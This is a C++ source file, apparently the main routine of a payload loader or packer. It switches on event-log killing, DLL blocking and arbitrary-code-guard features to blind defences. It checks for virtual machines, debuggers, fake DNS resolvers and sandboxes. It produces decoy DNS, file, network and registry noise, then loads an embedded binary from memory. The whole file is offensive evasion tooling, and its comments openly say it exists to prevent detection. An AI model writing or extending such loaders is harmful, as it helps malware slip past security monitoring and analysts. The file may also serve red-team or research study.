#include <string>
#include <iostream>
#include <thread>

#include <windows.h>
#include <loader.hpp>

#ifndef _GERNIG_DEBUG
#include <binexp.h>
// #include <dnsnoise.h>
// #include <dnsanalysis.h>
#include <defines.h>
#endif

#include <modules/print.hpp>
#include <modules/dns.hpp>
#include <modules/file.hpp>
#include <modules/anti-vm.hpp>
#include <modules/anti-debug.hpp>
#include <modules/eventlogkiller.hpp>
#include <modules/acg.hpp>
#include <modules/blockdlls.hpp>
#include <modules/registry.hpp>
#include <modules/network.hpp>

int main(int argc, char **argv)
{
// Disables certain services / functions to prevent the detection or collection of the activities of the program
#ifdef _EVENTLOG_BLIND_ENABLED
    std::thread eventlogBlindThread(eventlogkiller);
    eventlogBlindThread.join();
#endif

#ifdef _ACG_BLIND_ENABLED
    std::thread acgBlindThread(acg);
    acgBlindThread.join();
#endif

#ifdef _BLOCKDLL_BLIND_ENABLED
    std::thread blockdllBlindThread(blockdlls);
    blockdllBlindThread.join();
#endif

// Does system checks to ensure that the system does not have any undesirable conditions 
// (e.g. VM environment, fake DNS resolvers such as FakeNet etc)
#ifdef _DNS_ANALYSIS_ENABLED
    std::thread dnsAnalysisThread(checkDNS);
    dnsAnalysisThread.join();
#endif

#ifdef _MAC_ANALYSIS_ENABLED
    std::thread macaddrAnalysisThread(mac_addr_checks);
    macaddrAnalysisThread.join();
#endif

#ifdef _CPUID_ANALYSIS_ENABLED
    std::thread cpuidAnalysisThread(rdtsc_cpuid_check);
    cpuidAnalysisThread.join();
#endif

#ifdef _DEBUG_ANALYSIS_ENABLED
    std::thread debugAnalysisThread(debugger_present);
    debugAnalysisThread.join();
#endif

#ifdef _PROCESS_ANALYSIS_ENABLED
    std::thread processAnalysisThread(process_checks);
    processAnalysisThread.join();
#endif

#ifdef _SLEEP_ANALYSIS_ENABLED
    std::thread sleepAnalysisThread(sleep_check, _SLEEP_TIME);
    sleepAnalysisThread.join();
#endif


#ifdef _PRINT_NOISE_ENABLED
    std::thread printNoiseThread(printLoop, _PRINT_NOISE_TEXT);
#endif

#ifdef _DNS_NOISE_ENABLED
    std::thread dnsNoiseThread(queryDomains);
#endif

#ifdef _FILE_NOISE_ENABLED
    std::thread fileNoiseThread(generateFiles);
#endif

#ifdef _NETWORK_NOISE_ENABLED
    std::thread networkNoiseThread(random_connect);
#endif
#ifdef _REGISTRY_NOISE_ENABLED
    std::thread registryNoiseThread(find_dir);
#endif


#ifndef _GERNIG_DEBUG
    LoadFromMemory(&BINARY_ARRAY, sizeof(BINARY_ARRAY));
#else
    LoadFromFile(argv[1]);
#endif

    return 0;
}
